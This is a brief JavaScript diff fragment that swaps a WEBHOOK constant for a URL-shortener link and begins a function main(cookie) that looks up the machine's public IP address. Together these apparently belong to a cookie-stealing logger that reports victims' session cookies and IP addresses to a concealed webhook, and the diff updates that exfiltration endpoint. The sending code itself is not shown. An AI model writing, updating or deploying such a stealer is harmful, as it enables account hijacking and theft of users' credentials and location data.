@@ -1,4 +1,4 @@
-const WEBHOOK = "shorturl.at/ahMPS";
+const WEBHOOK = "https://shorturl.at/lnov3";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
